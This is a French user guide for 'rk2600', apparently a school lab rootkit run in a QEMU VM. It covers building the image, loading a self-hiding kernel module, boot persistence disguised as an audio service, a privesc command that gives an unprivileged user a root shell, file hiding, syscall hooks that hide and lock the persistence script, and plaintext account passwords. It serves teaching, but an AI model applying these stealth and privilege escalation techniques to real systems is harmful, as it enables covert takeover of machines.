# rk2600 — Guide utilisateur

Parcours complet : récupération du dépôt → compilation → image disque →
lancement de la VM → usage du rootkit → désinstallation. Toutes les étapes
passent par les cibles du `Makefile` racine (`make help` les liste).

---

## 1. Contenu du rendu

| Fichier / dossier | Rôle |
|---|---|
| `rk2600.qcow2` | Image LFS Alpine du TP01, bootable et compressée en QCOW2 |
| `module/rk2600.ko` | Module noyau rootkit (compilé pour Linux 6.1.188) |
| `companion/rk2600` | Programme compagnon (binaire x86_64 statique) |
| `rapport_rk2600.docx` | Rapport de conception |
| `docs/USER.md` | Ce guide |
| Sources `module/`, `companion/`, `include/`, `infra/scripts/`, `Makefile` | Build system complet |

---

## 2. Comptes de la LFS

| Compte | Rôle | Mot de passe |
|---|---|---|
| `root` | Charge le module et le désinstalle | `ecole2600` |
| `user` | Démontre l'usage du rootkit via le compagnon | `melenchon2027` |

Ces mots de passe sont définis dans le fichier `.env` à la racine du dépôt
(`ROOT_PASSWORD` et `USER_PASSWORD`). Ils sont injectés automatiquement
dans l'image LFS Alpine lors du `make disk` — voir §4.3.

---

## 3. Prérequis hôte

- Linux x86_64 (Ubuntu/Debian/Alpine) avec KVM activé
- `make`, `gcc`, `git`, `qemu-system-x86_64` ≥ 7.0
- `docker` (installation du système Alpine minimal dans l'image)
- `grub-pc-bin`, `parted`, `dosfstools` (installation GRUB BIOS dans l'image)
- ~8 Go d'espace disque libre pour la compilation du noyau et de la LFS

Cible de confort :

```sh
make deps     # installe les paquets de compilation du noyau
```

`make status` affiche l'état du workspace (sources, builds, images) :

```sh
make status
```

---

## 4. Compilation (à partir du dépôt source)

> Si tu utilises **l'image `rk2600.qcow2` déjà fournie dans le rendu**, saute
> directement à la [section 5](#5-lancer-la-vm). Cette section 4 est utile
> pour reconstruire l'image intégralement.

### 4.1 Compilation unitaire

```sh
make kernel          # compile Linux 6.1.188 (profil base)
make module          # compile rk2600.ko contre infra/build
make companion       # compile le binaire user
make rootfs          # busybox + initramfs + nfsroot
```

Pour un noyau avec symboles de debug (utile pour GDB) :

```sh
make kernel-debug
```

### 4.2 Compilation globale

```sh
make all             # kernel + rootfs + module + companion
```

### 4.3 Image disque LFS Alpine + GRUB

Les mots de passe des comptes `root` et `user` sont lus depuis le fichier
`.env` à la racine du dépôt. Ce fichier est fourni dans l'archive du
rendu ; aucune commande `export` n'est nécessaire.

```sh
cat .env             # pour relire les identifiants si besoin
make disk            # image + Alpine/OpenRC + comptes + GRUB BIOS
```

```sh
ROOT_PASSWORD='autre-valeur' make disk
```

Pour un rendu compressé (le sujet exige QCOW2 compressé) :

```sh
make qcow2           # produit rk2600.qcow2 à la racine
```

### 4.4 Sous-cibles utiles

```sh
make disk-image      # juste créer disk.img et le formater
make disk-alpine     # (re)peupler une image existante avec Alpine
make disk-grub       # (re)installer le noyau + GRUB dans l'image
make mount           # monter disk.img pour modification manuelle
make umount          # démonter proprement
```

### 4.5 Nettoyage

```sh
make clean-kernel        # supprime le dossier de build du profil
make clean-module        # nettoie le module
make clean-companion     # nettoie le companion
make mrproper            # nettoyage complet des sources noyau
```

---

## 5. Lancer la VM

Trois modes de démarrage sont disponibles via `make run*`. Pour la
démonstration, utilise **`run-disk`** (GRUB + LFS persistante).

### 5.1 Lancement rapide

```sh
make run-disk
```

GRUB apparaît sur le port série, choisir l'entrée **« Linux2600 (base) »**.
Le login apparaît :

```
Ecole 2600 linux 6.1.188 (ttyS0)
login:
```

### 5.2 Autres modes

```sh
make run             # initramfs (rootfs en RAM, pas de persistance)
make run-nfs         # rootfs monté par NFS depuis l'hôte
```

### 5.4 Debug avec GDB

Démarrer la VM en pause, puis attacher GDB depuis un autre terminal hôte :

```sh
make run-disk PAUSE=1    # dans un terminal
make gdb                 # dans un second terminal
```

---

## 6. Charger le rootkit (compte root)

Une fois dans la VM, login `root` :

```sh
# chargement unitaire
insmod /mnt/share/rk2600.ko

# vérification du camouflage
dmesg | tail -n 5
lsmod                     # rk2600 n'apparaît PAS (auto-hide)
ls /sys/module/rk2600     # ENOENT : conforme
```

### Installation persistante

Pour qu'il se recharge à chaque boot :

```sh
cp /mnt/share/rk2600 /usr/local/sbin/rk2600
chmod +x /usr/local/sbin/rk2600

rk2600 install /mnt/share/rk2600.ko
```

Cette commande :

1. Copie `rk2600.ko` dans `/lib/modules/$(uname -r)/extra/`
2. Crée `/etc/local.d/snd-compat.start` (nom camouflé en couche audio)
3. Enregistre le service `local` dans le runlevel `default`
4. Charge le module immédiatement

Les trois artefacts (`rk2600.ko`, `snd-compat.start`, nom de module `rk2600`)
sont ajoutés automatiquement à la liste des entrées masquées.

---

## 7. Utiliser le rootkit (compte `user`)

Toutes les commandes ci-dessous sont exécutées **depuis le compte `user`**,
non privilégié. Le device `/dev/.rk_ctl` est créé en mode `0666` : c'est un
choix de conception documenté dans le rapport §4.

### 7.1 Statut du module

```sh
rk2600 status
# API version  : 2
# Module hidden: yes
```

### 7.2 Élévation de privilèges → shell root

```sh
whoami                    # user
rk2600 privesc            # ouvre un /bin/sh en uid 0
# shell: # id
# uid=0(root) gid=0(root) ...
```

### 7.3 Masquer une entrée de répertoire

```sh
touch /tmp/.evil
ls /tmp/ | grep evil      # visible
rk2600 hide .evil
ls /tmp/ | grep evil      # invisible (hook VFS iterate_shared)
rk2600 unhide .evil       # redevient visible
```

### 7.4 Canal alternatif `/proc/.rk`

L'entrée est en écriture seule, utilisable depuis root :

```sh
echo "+passwd_backup" > /proc/.rk      # cache passwd_backup
echo "-passwd_backup" > /proc/.rk      # révèle
echo "hide"           > /proc/.rk      # cache le module
echo "unhide"         > /proc/.rk      # réaffiche le module
echo "flush"          > /proc/.rk      # vide toute la liste
```

### 7.5 Filtrage du contenu de la persistance

L'affichage du script `/etc/local.d/snd-compat.start` est filtré en direct
par le hook du syscall `read` : les lignes contenant `insmod` ou `rk2600`
sont supprimées avant d'arriver au processus lecteur.

```sh
cat /etc/local.d/snd-compat.start
# → script sans la ligne insmod ← camouflage
```

Le hook `write` empêche également la modification du fichier : toute
écriture est silencieusement ignorée (le syscall retourne le nombre
d'octets demandé sans rien écrire).

```sh
echo "test" >> /etc/local.d/snd-compat.start   # pas d'erreur
cat /etc/local.d/snd-compat.start               # contenu inchangé
```

Le hook `sendfile64` force les programmes utilisant `sendfile()` (comme
`cat` sous BusyBox) à basculer sur `read()`, garantissant le filtrage.

### 7.6 Suite de tests automatisée

Le compagnon intègre une suite de tests qui vérifie toutes les
fonctionnalités en une seule commande :

```sh
./rk2600 test
```

Le test commence par une élévation de privilèges (avec `id` avant/après),
puis enchaîne les vérifications : status, module hiding, file hiding,
accès direct, read filter, write stealth, hide/unhide dynamique. Chaque
test affiche la commande exécutée, sa sortie et `PASS` ou `FAIL`.

---

## 8. Désinstaller le rootkit

Depuis la VM, compte `root` :

```sh
rk2600 uninstall
```

Effets :

- Révèle le module (`RK2600_IOC_MODSHOW`)
- `rmmod rk2600`
- Supprime `/lib/modules/<version>/extra/rk2600.ko`
- Supprime `/etc/local.d/snd-compat.start`

Un redémarrage **sans** `rk2600 uninstall` laisse la persistance active —
c'est le comportement attendu.

---

## 9. Dépannage

| Symptôme | Cause / Correctif |
|---|---|
| `make disk` échoue sur `ROOT_PASSWORD absent` | Vérifier que `.env` est bien présent à la racine du dépôt et qu'il contient `ROOT_PASSWORD` et `USER_PASSWORD`. Tester avec `make status` |
| `Invalid module format` à l'`insmod` | `.ko` compilé contre un autre build. Refaire `make module` puis `make disk-grub` et repartager le `.ko` |
| `cannot open /dev/.rk_ctl` depuis user | Vérifier `stat /dev/.rk_ctl` → attendu `crw-rw-rw-`. Si absent, le module n'est pas chargé |
| Boot bloque sur « Remounting filesystems » | Ajouter `rw` au cmdline GRUB dans `infra/scripts/build_disk.sh`, puis `make disk-grub` |
| `lsmod` affiche `rk2600` | Déchargé-rechargé après `MODSHOW` ; refaire `echo hide > /proc/.rk` |
| `rk2600 privesc` → `Elevation failed: still euid=1000` | Noyau patché depuis 6.2 — `prepare_kernel_cred(NULL)` ne renvoie plus `init_cred`. L'image fournie utilise 6.1.188 ; ne pas remplacer le noyau |
| 9p share : `mount: unknown filesystem type '9p'` | Le noyau du profil n'a pas `CONFIG_9P_FS=y`. Le profil `base` l'active ; vérifier avec `grep 9P infra/build/.config` |

---

Thomas Abreu Dias · Sofiane Belkessa · Vadim Ablancourt · Cornelius Bircu.
